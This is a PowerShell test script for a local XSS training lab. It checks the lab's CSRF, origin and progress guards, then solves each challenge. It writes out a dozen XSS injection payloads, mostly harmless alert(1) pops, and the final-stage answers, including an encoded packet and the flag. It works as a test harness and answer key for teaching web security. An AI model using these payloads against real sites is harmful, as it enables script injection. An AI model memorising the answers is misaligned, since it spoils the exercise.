param([switch]$GuardsOnly)
$ErrorActionPreference = 'Stop'
$base = 'http://localhost/xss'
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$landingResponse = Invoke-WebRequest -UseBasicParsing -Uri "$base/" -WebSession $session
$config = ([regex]::Match($landingResponse.Content, '<script type="application/json" id="rangeProgressConfig">(.*?)</script>').Groups[1].Value | ConvertFrom-Json)
function Api($action, $id, $extra = @{}) {
    $body = @{action=$action;challenge=$id;csrf=$config.csrf}
    foreach ($key in $extra.Keys) { $body[$key] = $extra[$key] }
    Invoke-RestMethod -Uri "$base/shared/api.php" -WebSession $session -Method Post -Body $body
}
function Expect-Rejection($action, $id, $extra, $status) {
    try { $null = Api $action $id $extra; throw "Unexpected acceptance: $action $id" }
    catch { if (!$_.Exception.Response -or [int]$_.Exception.Response.StatusCode -ne $status) { throw } }
}
function Solve($id, $payload, $stage = '') {
    $run = Api 'launch' $id @{payload=$payload;stage=$stage}
    $target = Invoke-WebRequest -UseBasicParsing -Uri ('http://localhost' + $run.url) -WebSession $session
    $proof = [regex]::Match($target.Content, 'const proof = "([a-f0-9]+)"').Groups[1].Value
    if (!$proof) { throw 'Target proof not found.' }
    Api 'solve' $id @{run=$run.run;proof=$proof}
}
$sync = Api 'sync_progress' '' @{solved=($config.regularIds | ConvertTo-Json -Compress)}
if ($sync.solved.Count -ne 0) { throw 'Forged progress accepted.' }
Expect-Rejection 'launch' 'final-relay' @{stage='1';payload=''} 403
Expect-Rejection 'preview_launch' 'final-relay' @{stage='1';payload=''} 403
foreach ($route in @('/final/index.php', '/final/index.php?preview=1&stage=3')) {
    $lockedPage = Invoke-WebRequest -UseBasicParsing -Uri ($base + $route) -WebSession $session
    if (!$lockedPage.Content.Contains('finalLockScreen') -or $lockedPage.Content.Contains('id="targetFrame"')) { throw 'Locked mission exposed playable content.' }
}
Expect-Rejection 'launch' 'dispatch' @{payload=('a' * 6001)} 400
Expect-Rejection 'launch' 'dispatch' @{payload='safe';csrf='wrong'} 403
Expect-Rejection 'solve' 'dispatch' @{run=('0' * 48);proof=('0' * 48)} 409
$run = Api 'launch' 'dispatch' @{payload='ordinary text'}
$target = Invoke-WebRequest -UseBasicParsing -Uri ('http://localhost' + $run.url) -WebSession $session
$proof = [regex]::Match($target.Content, 'const proof = "([a-f0-9]+)"').Groups[1].Value
Expect-Rejection 'solve' 'dispatch' @{run=$run.run;proof=$proof} 422
Expect-Rejection 'solve' 'label' @{run=$run.run;proof=$proof} 409
try {
    $null = Invoke-RestMethod -Uri "$base/shared/api.php" -WebSession $session -Method Post -Headers @{Origin='http://attacker.invalid'} -Body @{action='launch';challenge='dispatch';csrf=$config.csrf;payload='safe'}
    throw 'Cross-origin request accepted.'
} catch { if (!$_.Exception.Response -or [int]$_.Exception.Response.StatusCode -ne 403) { throw } }
Write-Output 'PASS: forged progress, locked final, oversized input, and source-proof-only solve rejected.'
Write-Output 'PASS: CSRF, origin, nonexistent run, and challenge/run mismatch guards.'
if ($GuardsOnly) { return }
$cases = @(
    @('dispatch','<svg onload=alert(1)>'),
    @('label','" autofocus onfocus=alert(1) x="'),
    @('tracker',"';alert(1);//"),
    @('greeting','${alert(1)}'),
    @('badge','<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate></svg>'),
    @('archive','</script><svg onload=alert(1)>'),
    @('inbox','<svg onload=alert(1)>'),
    @('directory',"';alert(1);//"),
    @('reviews','<b></b><svg onload=alert(1)>'),
    @('routes','<svg onload=alert(1)>'),
    @('depots','</option></select><svg onload=alert(1)>'),
    @('message','<img src=data:, onerror=alert(1)>')
)
foreach ($case in $cases) {
    if ($case[0] -in @('inbox','directory','reviews')) { $null = Api 'save' $case[0] @{payload=$case[1]} }
    $result = Solve $case[0] $case[1]
    if ($result.solved -notcontains $case[0]) { throw "Missing solve: $($case[0])" }
    Write-Output "PASS: intended XSS $($case[0])"
}
Expect-Rejection 'launch' 'final-relay' @{stage='3';payload=''} 403
Expect-Rejection 'submit_flag' 'final-relay' @{flag='FLAG{last_handoff}'} 409
$result = Solve 'final-relay' '{"lane":"night","note":"%3Csvg%20onload%3Dalert(1)%3E"}' '1'
if ($result.completedStage -ne 1) { throw 'Final stage 1 failed.' }
Write-Output 'PASS: final stage 1'
$result = Solve 'final-relay' "\';alert(1);//" '2'
if ($result.completedStage -ne 2) { throw 'Final stage 2 failed.' }
Write-Output 'PASS: final stage 2'
$result = Solve 'final-relay' '{"packet":"TFBQRBEAHA0NWBYYDgALHVkGGhZO","stamp":"4ae6"}' '3'
if ($result.completedStage -ne 3) { throw 'Final stage 3 failed.' }
Expect-Rejection 'submit_flag' 'final-relay' @{flag='WRONG'} 400
$result = Api 'submit_flag' 'final-relay' @{flag='FLAG{last_handoff}'}
if (!$result.complete) { throw 'Valid final flag failed.' }
$preview = Api 'preview_launch' 'final-relay' @{stage='1';payload=''}
$previewHtml = Invoke-WebRequest -UseBasicParsing -Uri ('http://localhost' + $preview.url) -WebSession $session
$previewProof = [regex]::Match($previewHtml.Content, 'const proof = "([a-f0-9]+)"').Groups[1].Value
Expect-Rejection 'solve' 'final-relay' @{run=$preview.run;proof=$previewProof} 403
$null = Api 'reset' 'dispatch'
Expect-Rejection 'launch' 'final-relay' @{stage='1';payload=''} 403
$result = Api 'sync_progress' '' @{solved='[]'}
if ($result.finalState.complete -or $result.finalState.completedStage -ne 0) { throw 'Final state survived prerequisite reset.' }
Write-Output 'PASS: final stages, flag gate, preview isolation, reset revocation.'
